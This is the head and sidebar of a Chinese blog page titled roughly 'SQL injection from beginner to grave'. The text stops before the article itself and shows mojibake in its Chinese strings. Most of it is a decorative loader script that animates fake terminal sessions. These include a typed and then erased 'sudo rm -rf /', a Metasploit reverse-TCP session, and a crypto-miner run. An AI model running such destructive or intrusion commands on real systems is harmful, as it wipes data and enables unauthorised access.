<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="æ°¸æ— æ­¢å¢ƒ">
<title>SQLæ³¨å…¥ï¼šä»å…¥é—¨åˆ°å…¥åœŸ</title>

<link rel='canonical' href='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>

<link rel="stylesheet" href="/scss/style.min.39ecf65bc226010541aa6d3e165db03375656b61e3e66bd0edb6ef189caf76fb.css"><meta property='og:title' content="SQLæ³¨å…¥ï¼šä»å…¥é—¨åˆ°å…¥åœŸ">
<meta property='og:description' content="æ°¸æ— æ­¢å¢ƒ">
<meta property='og:url' content='https://blog.928330.xyz/p/sql%E6%B3%A8%E5%85%A5%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/'>
<meta property='og:site_name' content='kakahuote'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='SQL' /><meta property='article:published_time' content='2025-07-02T00:52:02&#43;08:00'/><meta property='article:modified_time' content='2025-08-31T00:31:28&#43;08:00'/><meta property='og:image' content='http://picture.928330.xyz/typora/bbe3473c5e7044490ec526dc455a0a8c.jpeg' />
<meta name="twitter:title" content="SQLæ³¨å…¥ï¼šä»å…¥é—¨åˆ°å…¥åœŸ">
<meta name="twitter:description" content="æ°¸æ— æ­¢å¢ƒ"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://picture.928330.xyz/typora/bbe3473c5e7044490ec526dc455a0a8c.jpeg' />
    <link rel="shortcut icon" href="/favicon.ico" />
<style>
     
     
     
    #geek-loader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        background-color: #050505;
        z-index: 9999999;
        display: flex;
        justify-content: center;
        align-items: center;
        font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
        transition: opacity 0.5s ease-out, transform 0.5s cubic-bezier(0.6, -0.28, 0.735, 0.045);
        overflow: hidden;
        cursor: progress;
        touch-action: none;  
    }

     
    #geek-loader::after {
        content: " ";
        display: block;
        position: absolute;
        top: 0; left: 0; bottom: 0; right: 0;
        background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                    linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
        z-index: 2;
        background-size: 100% 2px, 3px 100%;
        pointer-events: none;
        opacity: 0.6;
    }

    .terminal-window {
        width: 800px;
        height: 500px;
        max-width: 90%;
        background: rgba(13, 17, 23, 0.96);
        border: 1px solid #30363d;
        border-radius: 8px;
        box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05), 
                    0 50px 100px rgba(0, 0, 0, 0.8), 
                    0 0 50px rgba(0, 255, 127, 0.05);
        display: flex;
        flex-direction: column;
        position: relative;
        backdrop-filter: blur(12px);
        transform: translateY(0);
        overflow: hidden;
        transition: filter 0.1s, transform 0.1s, border-color 0.1s;
    }

     
    @media (max-width: 768px) {
        .terminal-window {
            height: 60vh; 
            max-width: 92%;
            backdrop-filter: none;
            background: #0d1117;
            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
        }
        #geek-loader::after { opacity: 0.2; }  
    }

     
    
     
    .terminal-window.interference {
        animation: glitch-anim 0.2s infinite;
        filter: contrast(1.2) brightness(1.2) hue-rotate(5deg);
        border-color: #ffbd2e;  
    }
    
     
    .terminal-window.critical-error {
        animation: glitch-anim-hard 0.1s infinite;
        filter: contrast(1.5) brightness(0.8) sepia(1) hue-rotate(-50deg);
        border-color: #ff5f56;  
    }

    @keyframes glitch-anim {
        0% { transform: translate(0) }
        20% { transform: translate(-2px, 2px) }
        40% { transform: translate(-2px, -2px) }
        60% { transform: translate(2px, 2px) }
        80% { transform: translate(2px, -2px) }
        100% { transform: translate(0) }
    }

    @keyframes glitch-anim-hard {
        0% { transform: translate(0) skew(0deg); }
        20% { transform: translate(-5px, 0) skew(-10deg); }
        40% { transform: translate(5px, 0) skew(10deg); }
        60% { transform: translate(-2px, 5px) skew(0deg); }
        80% { transform: translate(2px, -5px) skew(0deg); }
        100% { transform: translate(0) skew(0deg); }
    }

     
    .noise-overlay {
        position: absolute;
        top: 0; left: 0; width: 100%; height: 100%;
        pointer-events: none; z-index: 10;
        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.65' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)' opacity='0.1'/%3E%3C/svg%3E");
        opacity: 0;
        transition: opacity 0.1s;
    }
    .terminal-window.interference .noise-overlay { opacity: 0.15; }
    .terminal-window.critical-error .noise-overlay { opacity: 0.35; }

     
    .terminal-header {
        display: flex; justify-content: space-between; align-items: center;
        padding: 10px 16px; background: #0d1117;
        border-bottom: 1px solid #30363d; flex-shrink: 0; z-index: 5;
    }

    .terminal-controls { display: flex; gap: 8px; }
    .control-dot { width: 12px; height: 12px; border-radius: 50%; }
    .close { background: #ff5f56; }
    .minimize { background: #ffbd2e; }
    .maximize { background: #27c93f; }

    .terminal-status {
        color: #8b949e; font-size: 12px; font-family: monospace;
        display: flex; gap: 15px; opacity: 0.8;
    }
    
     
    .signal-indicator { display: flex; gap: 2px; align-items: flex-end; height: 12px; }
    .signal-bar { width: 3px; background: #30363d; transition: background 0.2s; }
    .signal-bar.active { background: #7ee787; }
    .signal-bar.weak { background: #ffbd2e; }
    .signal-bar.offline { background: #ff5f56; }
    .signal-bar:nth-child(1) { height: 4px; }
    .signal-bar:nth-child(2) { height: 6px; }
    .signal-bar:nth-child(3) { height: 8px; }
    .signal-bar:nth-child(4) { height: 12px; }

    .terminal-content {
        flex: 1; padding: 16px; overflow: hidden;
        color: #c9d1d9; font-size: 13px; line-height: 1.6;
        display: flex; flex-direction: column; justify-content: flex-start;
        position: relative; z-index: 1;
    }

    .line { min-height: 1.6em; white-space: pre-wrap; word-break: break-all; margin-bottom: 2px; }

     
    .c-user { color: #d2a8ff; font-weight: bold; }
    .c-host { color: #c9d1d9; }
    .c-path { color: #79c0ff; font-weight: bold; }
    .c-prompt { color: #7ee787; }
    .c-cmd { color: #e6edf3; font-weight: bold; }
    .c-green { color: #7ee787; }
    .c-red { color: #ff7b72; }
    .c-blue { color: #79c0ff; }
    .c-yellow { color: #d29922; }
    .c-purple { color: #d2a8ff; }
    .c-gray { color: #8b949e; }
    .c-orange { color: #ffa657; }
    .c-matrix { color: #0f0; text-shadow: 0 0 5px #0f0; }
    .blink-red { animation: blink-red 0.5s infinite; color: #ff7b72; font-weight: bold; }
    
    .cursor-block {
        display: inline-block; width: 9px; height: 16px;
        background-color: #c9d1d9; vertical-align: middle;
        margin-left: 2px; margin-bottom: -2px;
        animation: blink 1s step-end infinite;
    }
    .typing .cursor-block { animation: none; opacity: 1; }
    @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
    @keyframes blink-red { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }

    .loader-hidden {
        opacity: 0; transform: scale(0.95) translateY(20px); pointer-events: none;
    }
    
    .progress-track { color: #30363d; }
    
     
    .skip-hint {
        position: absolute; bottom: 15px; width: 100%; text-align: center;
        color: #484f58; font-size: 10px; opacity: 0;
        animation: fadeInHint 1s ease-in forwards 1s; pointer-events: none;
    }
    @keyframes fadeInHint { to { opacity: 1; } }
</style>

<div id="geek-loader">
    <div class="terminal-window" id="term-window">
        <div class="noise-overlay"></div>
        <div class="terminal-header">
            <div class="terminal-controls">
                <div class="control-dot close"></div>
                <div class="control-dot minimize"></div>
                <div class="control-dot maximize"></div>
            </div>
            <div class="terminal-status">
                <div class="signal-indicator" id="signal-bars">
                    <div class="signal-bar active"></div>
                    <div class="signal-bar active"></div>
                    <div class="signal-bar active"></div>
                    <div class="signal-bar active"></div>
                </div>
                <div id="connection-status">NET: STABLE</div>
                <div>MEM: <span id="mem-usage">14</span>%</div>
            </div>
        </div>
        <div class="terminal-content" id="term-content"></div>
        <div class="skip-hint">Double tap to skip initialization...</div>
    </div>
</div>

<script>
(function() {
     
     
     
    const isMobile = window.innerWidth < 768;
    
    const CONFIG = {
        typingBaseSpeed: 15,    
        typingVariance: 10,
        
        maxLoadTime: isMobile ? 4000 : 6000, 
        isLoaded: false,
        skipMode: false,
        interferenceChance: 0.15
    };

    const loader = document.getElementById('geek-loader');
    const termWindow = document.getElementById('term-window');
    const termContent = document.getElementById('term-content');
    const memUsage = document.getElementById('mem-usage');
    const signalBars = document.querySelectorAll('.signal-bar');
    const connectionStatus = document.getElementById('connection-status');

    
    
    
    
    
    window.addEventListener('load', () => { CONFIG.isLoaded = true; });
    
    
    document.addEventListener('DOMContentLoaded', () => {
        
        setTimeout(() => { CONFIG.isLoaded = true; }, 1000);
    });

    if (document.readyState === 'complete') CONFIG.isLoaded = true;

    
    setTimeout(() => {
        if (!CONFIG.isLoaded) {
            CONFIG.isLoaded = true; 
            CONFIG.skipMode = true; 
        }
    }, CONFIG.maxLoadTime);

    
    loader.addEventListener('dblclick', () => { CONFIG.skipMode = true; CONFIG.isLoaded = true; });
    loader.addEventListener('touchstart', (e) => {
        if(e.touches.length > 1) { CONFIG.skipMode = true; CONFIG.isLoaded = true; } 
    });

     
    
    setInterval(() => {
        if (!CONFIG.isLoaded) {
            memUsage.innerText = Math.floor(Math.random() * 40) + 20;
            
            
            if (Math.random() > 0.8) {
                const quality = Math.floor(Math.random() * 4);
                signalBars.forEach((bar, i) => {
                    bar.className = 'signal-bar';
                    if (i <= quality) bar.classList.add(quality < 2 ? 'weak' : 'active');
                });
                if (quality < 2) {
                    connectionStatus.innerText = "NET: FLUCTUATING";
                    connectionStatus.style.color = "#ffbd2e";
                    if (!CONFIG.skipMode) triggerInterference(150);
                } else {
                    connectionStatus.innerText = "NET: STABLE";
                    connectionStatus.style.color = "#8b949e";
                }
            }
        } else {
            signalBars.forEach(b => b.className = 'signal-bar active');
            connectionStatus.innerText = "NET: SECURE";
            connectionStatus.style.color = "#7ee787";
        }
    }, 600);

     
     
     
    const sleep = ms => new Promise(r => setTimeout(r, CONFIG.skipMode ? 0 : ms));
    const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

    function triggerInterference(duration = 150, critical = false) {
        if (CONFIG.skipMode || CONFIG.isLoaded) return;
        const className = critical ? 'critical-error' : 'interference';
        termWindow.classList.add(className);
        setTimeout(() => termWindow.classList.remove(className), duration);
    }

    function createLine() {
        const div = document.createElement('div');
        div.className = 'line';
        termContent.appendChild(div);
        termContent.scrollTop = termContent.scrollHeight;
        return div;
    }

    function getPrompt() {
        const paths = ['~', '~/blog', '~/deploy', '/var/www', '/etc/nginx', '~/satellite', '/usr/bin', '~/lab', '/tmp/cache'];
        const path = paths[Math.floor(Math.random() * paths.length)];
        return `<span class="c-user">admin</span><span class="c-gray">@</span><span class="c-host">node-x</span>:<span class="c-path">${path}</span><span class="c-prompt">$</span> `;
    }

    async function typeText(text, element) {
        if (CONFIG.skipMode) {
            element.innerHTML = element.innerHTML.replace('<span class="cursor-block"></span>', '') + text;
            return;
        }
        element.classList.add('typing');
        let cursorHtml = '<span class="cursor-block"></span>';
        let currentHtml = element.innerHTML.replace(cursorHtml, '');
        
        for (let i = 0; i < text.length; i++) {
            if (CONFIG.skipMode) {
                element.innerHTML = currentHtml + text.substring(i);
                break;
            }
            
            const speed = CONFIG.isLoaded ? 1 : randomInt(CONFIG.typingBaseSpeed, CONFIG.typingBaseSpeed + CONFIG.typingVariance);
            await sleep(speed);
            currentHtml += text[i];
            element.innerHTML = currentHtml + cursorHtml;
            termContent.scrollTop = termContent.scrollHeight;
        }
        element.classList.remove('typing');
    }

    async function backspace(count, element) {
        if (CONFIG.skipMode) return;
        element.classList.add('typing');
        let cursorHtml = '<span class="cursor-block"></span>';
        let fullHtml = element.innerHTML.replace(cursorHtml, '');
        for (let i = 0; i < count; i++) {
            if (CONFIG.skipMode) break;
            await sleep(20); 
            fullHtml = fullHtml.slice(0, -1);
            element.innerHTML = fullHtml + cursorHtml;
        }
        element.classList.remove('typing');
    }

    async function printLog(text, colorClass = '') {
        const line = createLine();
        if (CONFIG.skipMode) {
            line.innerHTML = `<span class="c-gray">>></span> <span class="${colorClass}">${text}</span>`;
            return;
        }
        const timestamp = new Date().toLocaleTimeString('en-US', {hour12: false});
        line.innerHTML = `<span class="c-gray">[${timestamp}]</span> <span class="${colorClass}">${text}</span>`;
        if (Math.random() < CONFIG.interferenceChance) triggerInterference(80);
        await sleep(CONFIG.isLoaded ? 2 : randomInt(5, 30)); 
    }

    async function progressBar(label, width = 15) {
        if (CONFIG.skipMode) {
            createLine().innerHTML = `${label} [DONE] 100%`;
            return;
        }
        const line = createLine();
        const empty = 'â–‘';
        const fill = 'â–ˆ';
        const barWidth = isMobile ? 10 : width;
        
        for (let i = 0; i <= barWidth; i++) {
            if (CONFIG.skipMode || (CONFIG.isLoaded && i < barWidth)) i = barWidth; 
            const percent = Math.round((i / barWidth) * 100);
            const filledStr = fill.repeat(i);
            const emptyStr = empty.repeat(barWidth - i);
            const color = i === barWidth ? 'c-green' : 'c-blue';
            line.innerHTML = `${label} [<span class="${color}">${filledStr}<span class="progress-track">${emptyStr}</span></span>] ${percent}%`;
            
            
            if (i === Math.floor(barWidth/2) && Math.random() < 0.3) {
                triggerInterference(200);
                await sleep(300);
            }
            await sleep(CONFIG.isLoaded ? 2 : randomInt(15, 50));
        }
    }

     
     
     
    
    
    const rareScenarios = [
        async () => { 
            const line = createLine(); line.innerHTML = getPrompt() + '<span class="cursor-block"></span>';
            await typeText('sudo rm -rf /', line);
            await sleep(600); triggerInterference(300, true);
            await backspace(11, line);
            await sleep(100);
            await typeText('./deploy.sh --safe', line);
            line.innerHTML = line.innerHTML.replace('<span class="cursor-block"></span>', '');
            await printLog('Initializing safety protocols...', 'c-green');
            await progressBar('System Recovery');
        },
        async () => { 
            const line = createLine(); line.innerHTML = getPrompt() + '<span class="cursor-block"></span>';
            await typeText('python3 train_core.py', line);
            line.innerHTML = line.innerHTML.replace('<span class="cursor-block"></span>', '');
            await printLog('TensorFlow v2.14.0 init...', 'c-purple');
            for(let i=1; i<=3; i++) { createLine().innerHTML = `Epoch ${i}/100: loss: 0.${9-i}23`; await sleep(50); }
            createLine().innerHTML = `<span class="c-red blink-red">WARNING: SENTIENCE DETECTED</span>`;
            triggerInterference(500, true); await sleep(300);
            createLine().innerHTML = `<span class="c-purple">AI: "I see you."</span>`;
            await sleep(400);
            createLine().innerHTML = `<span class="c-gray">Purging buffer...</span>`;
            await progressBar('Memory Wipe');
        },
        async () => { 
            const line = createLine(); line.innerHTML = getPrompt() + '<span class="cursor-block"></span>';
            await typeText('vim config.sys', line);
            line.innerHTML = line.innerHTML.replace('<span class="cursor-block"></span>', '');
            await sleep(100); termContent.innerHTML = '';
            createLine().innerHTML = `<span class="c-blue">~</span>`;
            const cmd = createLine(); cmd.innerHTML = ':q<span class="cursor-block"></span>';
            await sleep(300);
            createLine().innerHTML = `<span class="c-red">E37: No write since last change</span>`;
            triggerInterference(200, true);
            cmd.innerHTML = ':wq!<span class="cursor-block"></span>';
            await sleep(200); termContent.innerHTML = '';
            await printLog('Config saved.', 'c-green');
        }
    ];

    
    const normalScenarios = [
        
        async () => {
            await typeText('dmesg | tail -n 5', createLine());
            const logs = ["[ 0.000] Linux version 6.5.0", "[ 0.451] ACPI: OK", "[ 1.022] EXT4-fs: mounted", "[ 1.455] systemd: OK"];
            for (let l of logs) await printLog(l, 'c-gray');
            await printLog('Kernel initialized.', 'c-green');
        },
        async () => {
            await typeText('docker build -t blog .', createLine());
            await printLog('Sending context 45MB', 'c-gray');
            await progressBar('Pulling layers');
            await printLog('Built 3a1b2c', 'c-green');
        },
        async () => {
            await typeText('kubectl get pods', createLine());
            await printLog('api-0   0/1     CrashLoopBackOff', 'c-red');
            await sleep(200); triggerInterference(100);
            await typeText('kubectl scale --replicas=3 deploy/api', createLine());
            await printLog('deployment.apps/api scaled', 'c-green');
        },
        async () => {
            await typeText('terraform apply -auto-approve', createLine());
            await printLog('+ aws_instance.web', 'c-green');
            await progressBar('Provisioning', 15);
            await printLog('Apply complete!', 'c-green');
        },
        async () => {
            await typeText('ansible-playbook site.yml', createLine());
            await printLog('TASK [Gathering Facts] ... ok', 'c-green');
            await printLog('TASK [Install Nginx] ... changed', 'c-yellow');
            await progressBar('Deploying Configs');
        },
        
        async () => {
            await typeText('nmap -v 10.0.0.1', createLine());
            await printLog('Scanning 1000 ports', 'c-blue');
            await progressBar('Stealth Scan');
            await printLog('Open ports: 80, 443', 'c-green');
        },
        async () => {
            await typeText('msfconsole -x "run"', createLine());
            await printLog('=[ metasploit v6.3.4 ]', 'c-blue');
            await printLog('[*] Started reverse TCP handler', 'c-gray');
            await progressBar('Sending Stage', 10);
            await printLog('[+] Session 1 opened', 'c-green');
        },
        async () => {
            await typeText('./ghidra_analyze binary.exe', createLine());
            await printLog('Analyzing PE Header...', 'c-gray');
            triggerInterference(100);
            await progressBar('Decompiling', 12);
            await printLog('42 functions exported.', 'c-green');
        },
        async () => {
            await typeText('tshark -i eth0 -f "port 80"', createLine());
            await printLog('Capturing on \'eth0\'', 'c-gray');
            for(let i=0; i<4; i++) { await printLog(`192.168.1.${randomInt(10,99)} -> GET /index.html`, 'c-blue'); await sleep(30); }
            await printLog('Packets captured.', 'c-green');
        },
        async () => { 
            await typeText('./matrix.sh', createLine());
            for(let i=0; i<5; i++) {
                if(CONFIG.skipMode) break;
                createLine().innerHTML = `<span class="c-matrix">${Math.random().toString(36).substring(2).repeat(3)}</span>`;
                await sleep(50);
            }
            await printLog('Follow the white rabbit.', 'c-green');
        },
        
        async () => {
            await typeText('git push origin main', createLine());
            await printLog('Enumerating objects: 32', 'c-gray');
            await progressBar('Compressing');
            await printLog('Push successful.', 'c-green');
        },
        async () => {
            await typeText('npm run start', createLine());
            await printLog('Starting react-scripts...', 'c-blue');
            await progressBar('Optimizing');
            await printLog('Compiled successfully.', 'c-green');
        },
        async () => {
            await typeText('cargo build --release', createLine());
            await progressBar('Compiling', 12);
            await printLog('Finished release [optimized]', 'c-green');
        },
        async () => {
            await typeText('go run main.go', createLine());
            await printLog('Compiling...', 'c-blue');
            await sleep(100);
            await printLog('Server listening on :8080', 'c-green');
        },
        async () => {
            await typeText('python3 manage.py migrate', createLine());
            await printLog('Applying contenttypes...', 'c-gray');
            await printLog('Applying auth...', 'c-gray');
            await printLog('Migration applied.', 'c-green');
        },
        
        async () => {
            await typeText('./xmrig --donate-level 1', createLine());
            await printLog('XMRig 6.18.0', 'c-orange');
            await printLog('CPU: AMD Ryzen 9 5950X', 'c-blue');
            await printLog('speed 14200.5 H/s', 'c-green');
        },
        async () => {
            await typeText('java -jar server.jar nogui', createLine());
            await printLog('[INFO]: Starting Minecraft 1.20', 'c-gray');
            await progressBar('Generating World', 10);
            await printLog('[INFO]: Done (2.4s)!', 'c-green');
        },
        async () => {
            await typeText('blender -b file.blend -f 1', createLine());
            await printLog('Fra:1 Mem:4096M', 'c-gray');
            await progressBar('Ray Tracing', 12);
            await printLog('Frame 1 saved.', 'c-green');
        },
        async () => {
            await typeText('uplink --connect sat-42', createLine());
            await printLog('Aligning dish...', 'c-blue');
            await progressBar('Signal Lock');
            triggerInterference(300);
            await printLog('Uplink established.', 'c-green');
        },
        async () => {
            await typeText('make coffee', createLine());
            await sleep(200);
            await printLog('Error: 418 I\'m a teapot', 'c-yellow');
            await typeText('brew install coffee', createLine());
            await printLog('Pouring...', 'c-green');
        },
        async () => {
            await typeText('whoami', createLine());
            await sleep(100);
            await printLog('root', 'c-green');
            await typeText('ls -la', createLine());
            await printLog('drwxr-xr-x 2 root root 4096 .', 'c-gray');
            await printLog('drwxr-xr-x 3 root root 4096 ..', 'c-gray');
            await printLog('-rw-r--r-- 1 root root  120 secret.txt', 'c-gray');
        },
        async () => {
            await typeText('grep -r "TODO" .', createLine());
            await sleep(300); 
            await printLog('./main.js: // TODO: fix memory leak', 'c-yellow');
            await printLog('./style.css: // TODO: center div', 'c-yellow');
            await printLog('Found 2 matches.', 'c-gray');
        },
        async () => {
            await typeText('ping 8.8.8.8', createLine());
            await printLog('64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=14.2 ms', 'c-gray');
            await printLog('64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=13.8 ms', 'c-gray');
            await typeText('^C', createLine()); 
        },
        async () => {
            await typeText('. build/envsetup.sh', createLine());
            await printLog('including device/generic/mini_emulator/vendorsetup.sh', 'c-gray');
            await typeText('lunch aosp_arm-eng', createLine());
            await progressBar('Building ROM');
            await printLog('Build completed.', 'c-green');
        },
        async () => {
            await typeText('redis-cli ping', createLine());
            await printLog('PONG', 'c-green');
            await typeText('redis-cli info | grep memory', createLine());
            await printLog('used_memory_human: 1.2M', 'c-gray');
        },
        async () => {
            await typeText('ffmpeg -i video.mp4 output.gif', createLine());
            await printLog('Stream #0:0 -> #0:0 (h264 -> gif)', 'c-blue');
            await progressBar('Encoding', 15);
            await printLog('Conversion failed successfully.', 'c-green');
        },
        async () => {
            await typeText('ssh user@192.168.1.5', createLine());
            await printLog('Authenticating...', 'c-gray');
            await sleep(300);
            await printLog('Welcome to Ubuntu 22.04 LTS', 'c-green');
        },
        async () => {
            await typeText('cat /var/log/syslog | grep "error"', createLine());
            triggerInterference(100);
            await printLog('Oct 27 10:00:01 server kernel: [Hardware Error]', 'c-red');
            await printLog('Oct 27 10:00:02 server systemd[1]: Failed to start service.', 'c-red');
        },
        async () => {
            await typeText('openssl genrsa -out key.pem 2048', createLine());
            await printLog('Generating RSA private key, 2048 bit long modulus', 'c-gray');
            await printLog('...................................+++++', 'c-gray');
            await printLog('e is 65537 (0x010001)', 'c-gray');
        }
    ];

     
     
     
    async function run() {
        document.body.style.overflow = 'hidden';
        
        
        const roll = Math.random();
        const scenario = roll < 0.1 
            ? rareScenarios[Math.floor(Math.random() * rareScenarios.length)]
            : normalScenarios[Math.floor(Math.random() * normalScenarios.length)];
        
        await scenario();

        
        
        
        let waitCounter = 0;
        
        
        const networkLogs = [
            "Resolving CDN topology...", 
            "Handshake negotiation pending...", 
            "Optimizing asset delivery...", 
            "Bypassing proxy gateway...", 
            "Allocating swap memory...", 
            "Verifying integrity checksums...",
            "Hydrating DOM tree...",
            "Mounting virtual filesystem...",
            "Syncing with satellite relay..."
        ];
        
        const retryLogs = [
            { msg: "Connection unstable. Retrying...", color: "c-yellow" },
            { msg: "Packet loss detected. Rerouting...", color: "c-orange" },
            { msg: "Switching to backup node...", color: "c-blue" },
            { msg: "Flushing DNS cache...", color: "c-gray" }
        ];

        
        while (!CONFIG.isLoaded && !CONFIG.skipMode) {
            
            const logIdx = Math.floor(Math.random() * networkLogs.length);
            await printLog(networkLogs[logIdx], 'c-gray');
            
            waitCounter++;
            
            
            if (waitCounter % 3 === 0) {
                const retryAction = retryLogs[Math.floor(Math.random() * retryLogs.length)];
                triggerInterference(200); 
                await printLog(retryAction.msg, retryAction.color);
            }
            
            await sleep(600);
        }

        
        
        
        const line = createLine();
        line.innerHTML = getPrompt() + '<span class="cursor-block"></span>';
        
        
        await typeText('init 5', line, 5.0); 
        line.innerHTML = line.innerHTML.replace('<span class="cursor-block"></span>', '');
        
        await sleep(50);
        
        
        termWindow.className = 'terminal-window'; 
        
        const welcome = createLine();
        welcome.innerHTML = `<span class="c-green">System Ready. GUI Starting...</span>`;
        welcome.style.textShadow = "0 0 10px #7ee787";
        
        await sleep(300);
        
        
        loader.classList.add('loader-hidden');
        document.body.style.overflow = '';
        setTimeout(() => loader.remove(), 500);
    }

    run();

})();
</script>
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="åˆ‡æ¢èœå•">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/" id="avatar-link">
                
                    
                    
                    
                        
                        <img class="site-logo original-logo" src="/img/avatar_hu_4804467f7cda2058.png" width="300" height="300" loading="lazy" alt="åŸå§‹å¤´åƒ">
                    
                    
                        
                        <img class="site-logo hover-logo" src="/img/avatar-hover_hu_f231304c77e946da.png" width="300" height="300" loading="lazy" alt="æ‚¬åœå¤´åƒ">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¤</span>
                
            </figure>
            
        

        <div class="site-meta">
            <h1 class="site-name"><a href="/">kakahuote</a></h1>
            <h2 class="site-description">é¡ä¸æœ‰åˆï¼Œé²œå…‹æœ‰ç»ˆ</h2>
        </div>
    </header>

    <ol class="menu-social">
                <li>
                    <a
                        href='https://bilibili.com'
                        target="_blank"
                        title="bilibili"
                        rel="me"
                    >
                        
                        
                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a
                        href='https://github.com'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            </ol>

    <ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>ä¸»é¡µ</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>å½’æ¡£</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>æœç´¢</span>
            </a>
        </li>
        
        
        <li >
            <a href='/%E5%8F%8B%E9%93%BE/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
